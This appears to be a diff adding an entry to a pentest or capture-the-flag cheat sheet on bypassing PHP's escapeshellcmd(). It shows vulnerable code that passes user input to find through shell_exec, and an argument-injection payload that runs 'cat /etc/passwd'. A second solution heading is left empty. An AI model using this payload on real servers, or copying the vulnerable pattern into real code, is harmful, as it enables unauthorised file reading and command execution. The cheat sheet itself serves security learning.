@@ -3689,7 +3689,28 @@ iconv -f utf-8 -t utf-7 < me.xml
 
 ---------------------
 
+### Bypassing escapeshellcmd() in php
 
+---------------------
+
+- Vulnerable code-:
+
+```php
+$safe_filename = escapeshellcmd($filename);
+$output = shell_exec("find /var/ -iname " . $safe_filename . " 2>&1");
+```
+
+- Solve to execute file and read file-:
+
+```php
+sth -or -exec cat /etc/passwd ; -quit
+```
+
+- Solve-:
+
+
+
+---------------------
 
 
 
